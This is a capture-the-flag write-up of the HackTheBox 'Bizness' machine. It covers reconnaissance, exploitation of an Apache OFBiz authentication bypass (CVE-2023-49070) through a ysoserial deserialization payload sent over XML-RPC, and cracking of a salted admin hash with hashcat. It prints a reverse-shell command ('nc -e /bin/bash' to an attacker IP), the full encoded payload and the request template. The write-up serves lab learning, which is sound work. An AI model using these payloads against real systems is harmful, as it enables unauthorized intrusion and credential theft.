# Introduction

![HTB: Bizness Title](https://github.com/het-desai/hackthebox/blob/main/bizness/screenshots/title.png "title")

In this detailed write-up of [HackTheBox: Bizness](https://app.hackthebox.com/machines/Bizness) machine, we will explore the systematic steps taken during a Capture The Flag (CTF) challenge to compromise a target system, gaining unauthorized access, and ultimately escalating privileges to the root user.

## Reconnaissance

The initial phase of the challenge involved reconnaissance to identify potential entry points and vulnerabilities.

```
nmap -p- -sV -sC -oN nmap_scan.txt 10.10.11.252
Host is up (0.39s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:                                                                                                                                                              
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)                                                                                                              
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)                                                                                                             
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)                                                                                                           
80/tcp   open  http      nginx 1.18.0                                                                                                                                       
|_http-server-header: nginx/1.18.0                                                                                                                                          
|_http-title: Did not follow redirect to https://bizness.htb/                                                                                                               
443/tcp  open  ssl/http  nginx 1.18.0                                                                                                                                       
| tls-alpn:                                                                                                                                                                 
|_  http/1.1                                                                                                                                                                
|_ssl-date: TLS randomness does not represent time                                                                                                                          
|_http-server-header: nginx/1.18.0                                                                                                                                          
|_http-title: Did not follow redirect to https://bizness.htb/                                                                                                               
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK                                                                
| Not valid before: 2023-12-14T20:03:40                                                                                                                                     
|_Not valid after:  2328-11-10T20:03:40                                                                                                                                     
| tls-nextprotoneg:                                                                                                                                                         
|_  http/1.1                                                                                                                                                                
8000/tcp open  http-alt?                                                                                                                                                    
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                     
                                                                                                                                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                              
Nmap done: 1 IP address (1 host up) scanned in 307.35 seconds
```

Ffuf tool helps to discover paths on the web application.

```
ffuf -u https://bizness.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt -fs 0 -c -s
FUZZ :  FFUFHASH : 954511 
FUZZ : control FFUFHASH : 9545140d 
FUZZ : index.html FFUFHASH : 954517e4
```

```
ffuf -u https://bizness.htb/control/FUZZ -w /usr/share/dirb/wordlists/common.txt -c -fl 492 -s
FUZZ : help FFUFHASH : e925275e 
FUZZ : login FFUFHASH : e925292b 
FFUFHASH : e925293a FUZZ : logout 
FFUFHASH : e9252970 FUZZ : main 
FUZZ : view FFUFHASH : e925210cc 
FUZZ : views FFUFHASH : e925210d5
```

## Vulnerability Analysis

![login page](https://github.com/het-desai/hackthebox/blob/main/bizness/screenshots/loginpage.png "login page")

The ofbiz application login page and version number in the footer. After the search on the internet about this version vulnerability. Found below usefull blogs.

[Prio-n blog](https://www.prio-n.com/blog/cve-2023-49070-51467-attacking-defending-Apache-OFBiz) explain the vulnerability over the ofbiz web framework.

Additional information and to confirm web framework developed language is [here](https://ofbiz.apache.org/).

For further exploitation used the Burpsuite to intercept requests and further analysis revealed the potential for command execution via the xmlrpc path.

Researching Ofbiz version 18.12 on the internet unveiled a critical vulnerability - CVE-2023-49070. This vulnerability allowed any user to bypass authentication, granting access to any page of the application.
Payload Creation with ysoserial

## Vulnerability Exploitation

To exploit the identified vulnerability, a payload was crafted using the ysoserial tool, which specializes in creating gadget chain payloads for Java applications. The payload was designed to execute a reverse shell

Note: If you face any error in ysoserial application check-out the solution in this [Portswigger form](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f)

```
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ~/tools/ysoserial-all.jar CommonsBeanutils1 "nc -e /bin/bash 10.10.16.52 50505" | base64 | tr -d '\n'

rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABrTK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAibmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwLjE0NSA1MDUwNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHHlzb3NlcmlhbC9Qd25lcjU3MDU4OTcyNzQ1MjEBAB5MeXNvc2VyaWFsL1B3bmVyNTcwNTg5NzI3NDUyMTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==
```

The payload was then injected into the target system via a crafted XML request on the /webtools/control/xmlrpc path. Before the injecting a payload. Need to Start netcat listener to listen reverse shell. Below XML format to construct the payload.

```xml
<?xml version="1.0"?>
<methodCall>
	<methodName>Methodname</methodName>
	<params>
		<param>
			<value>
				<struct>
					<member>
						<name>test</name>
						<value>
							<serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{Ysoserial Payload comes here}</serializable>
						</value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
```

![User access](https://github.com/het-desai/hackthebox/blob/main/bizness/screenshots/useraccess.png "user access")

## User Access

Upon successful execution of the payload, a reverse shell connection was established. I gained user-level access to the system. The initial foothold allowed exploration of the system, leading to the discovery of interesting files and directories.

## Privilege Escalation

A crucial step in the exploitation process was privilege escalation. I found an Admin password hash in the /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml file.

![Hash found in first file](https://github.com/het-desai/hackthebox/blob/main/bizness/screenshots/firsthash.png "First hash")

Note: Directory structure in ofbiz framer work explained [here](https://www.youtube.com/watch?v=uMs5eedtHYo).

The hash was identified as a SHA-1 variant and This looks like a half hash. So to find other half of the hash. I used find command to find a "currentPassword" term in all files.

```
find . -type f -exec grep -l -e "currentPassword" {} + 2>/dev/null
./applications/datamodel/data/demo/WorkEffortDemoData.xml
./applications/datamodel/data/demo/HumanresDemoData.xml
./applications/datamodel/data/demo/MarketingDemoData.xml
./applications/datamodel/data/demo/PartyDemoData.xml
./applications/datamodel/data/demo/ProductDemoData.xml
./applications/datamodel/data/demo/OrderDemoData.xml
./applications/datamodel/data/demo/ContentDemoData.xml
./applications/datamodel/data/demo/AccountingDemoData.xml
./applications/datamodel/entitydef/party-entitymodel.xml
./applications/party/widget/partymgr/PartyForms.xml
./applications/party/minilang/customer/CustomerEvents.xml
./applications/party/minilang/user/UserEvents.xml
./applications/party/minilang/test/PartyTests.xml
./applications/securityext/minilang/login/LoginMapProcs.xml
./runtime/data/derby/ofbiz/seg0/c54d0.dat
./runtime/logs/ofbiz-2023-12-16-2.log
./framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/LoginWorker.java
./framework/service/src/main/java/org/apache/ofbiz/service/ServiceDispatcher.java
./framework/catalina/src/main/java/org/apache/ofbiz/catalina/container/OFBizRealm.java
./framework/resources/templates/AdminUserLoginData.xml
./framework/common/config/SecurityUiLabels.xml
./framework/common/src/main/java/org/apache/ofbiz/common/login/LoginServices.java
./framework/common/src/main/java/org/apache/ofbiz/common/login/LdapAuthenticationServices.java
./framework/common/widget/SecurityForms.xml
./framework/common/servicedef/services.xml
./framework/common/minilang/test/UserLoginTests.xml
./framework/security/data/PasswordSecurityDemoData.xml
./framework/security/src/main/java/org/apache/ofbiz/security/SecurityUtil.java
./framework/security/entitydef/entitymodel.xml
./build/classes/java/main/org/apache/ofbiz/webapp/control/LoginWorker.class
./build/classes/java/main/org/apache/ofbiz/ldap/commons/AbstractOFBizAuthenticationHandler.class
./build/classes/java/main/org/apache/ofbiz/passport/event/LinkedInEvents.class
./build/classes/java/main/org/apache/ofbiz/passport/event/GitHubEvents.class
./build/classes/java/main/org/apache/ofbiz/passport/user/LinkedInAuthenticator.class
./build/classes/java/main/org/apache/ofbiz/passport/user/GitHubAuthenticator.class
./build/classes/java/main/org/apache/ofbiz/service/ServiceDispatcher.class
./build/classes/java/main/org/apache/ofbiz/catalina/container/OFBizRealm.class
./build/classes/java/main/org/apache/ofbiz/common/login/LdapAuthenticationServices.class
./build/classes/java/main/org/apache/ofbiz/common/login/LoginServices.class
./build/classes/java/main/org/apache/ofbiz/security/SecurityUtil.class
./build/distributions/ofbiz.tar
./docker/docker-entrypoint.sh
./plugins/example/testdef/assertdata/TestUserLoginData.xml
./plugins/ebaystore/data/DemoEbayStoreData.xml
./plugins/ebaystore/widget/EbayAccountForms.xml
./plugins/ebaystore/widget/EbayStoreForms.xml
./plugins/ebaystore/servicedef/services.xml
./plugins/ecommerce/template/customer/profile/EditProfile.ftl
./plugins/ecommerce/template/customer/ChangePassword.ftl
./plugins/ecommerce/data/DemoPurchasing.xml
./plugins/ecommerce/minilang/misc/AffiliateSimpleEvents.xml
./plugins/ecommerce/minilang/misc/AffiliateMapProcs.xml
./plugins/ecommerce/minilang/customer/QuickAnonCustomerEvents.xml
./plugins/ecommerce/minilang/customer/CustomerEvents.xml
./plugins/webpos/data/DemoRetail.xml
./plugins/ldap/src/main/java/org/apache/ofbiz/ldap/commons/AbstractOFBizAuthenticationHandler.java
./plugins/scrum/data/scrumDemoData.xml
./plugins/scrum/minilang/ScrumEvents.xml
./plugins/passport/src/main/java/org/apache/ofbiz/passport/event/LinkedInEvents.java
./plugins/passport/src/main/java/org/apache/ofbiz/passport/event/GitHubEvents.java
./plugins/passport/src/main/java/org/apache/ofbiz/passport/user/LinkedInAuthenticator.java
./plugins/passport/src/main/java/org/apache/ofbiz/passport/user/GitHubAuthenticator.java
./plugins/myportal/data/MyPortalDemoData.xml
./plugins/myportal/minilang/Events.xml
./plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml
```

## Root Access

The second hash found in /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat.

![Second part of the hash](https://github.com/het-desai/hackthebox/blob/main/bizness/screenshots/secondhash.png "second hash")

It looks like hash url-safe base64 encoded. It is generated by python base64 library. To decode this hash I used [cyberchef tool](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',false,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ). Once the random text got. I checked it on the hashes web tool to identify the hash type and crack the hash.

Note: Additional information about [Python base64 library doc](https://docs.python.org/3/library/base64.html#base64.urlsafe_b64encode)

![hashes identifier output](https://github.com/het-desai/hackthebox/blob/main/bizness/screenshots/hashcheck.png "hash check")

Before cracking the hash, I append the salt at the end of the hash. Because founded hash was salted. Salt is 'd'. The complete hash looks like `b8fd3f41a541a435857a8f3e751cc3a91c174362:d`

```
sudo hashcat -m 120 -a 0 "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=============================================================================================================================
* Device #2: pthread-AMD EPYC 7543 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness

Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha1($salt.$pass)
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Wed Feb  7 14:04:51 2024 (1 sec)
Time.Estimated...: Wed Feb  7 14:04:52 2024 (0 secs)
Guess.Base.......: File (/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4723.2 kH/s (0.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1478656/14344384 (10.31%)
Rejected.........: 0/1478656 (0.00%)
Restore.Point....: 1474560/14344384 (10.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: mosmosmos -> monkey-balls

Started: Wed Feb  10 14:04:30 2024
Stopped: Wed Feb  10 14:04:52 2024
```

The cracked password allowed for the final escalation to the root user.

![root access](https://github.com/het-desai/hackthebox/blob/main/bizness/screenshots/rootaccess.png "root access")

## Conclusion

This comprehensive write-up has provided a step-by-step account of the techniques and tools employed during the CTF challenge. From initial reconnaissance to the exploitation of a critical vulnerability and subsequent privilege escalation, the journey showcases the importance of thorough analysis and methodology in identifying security risk.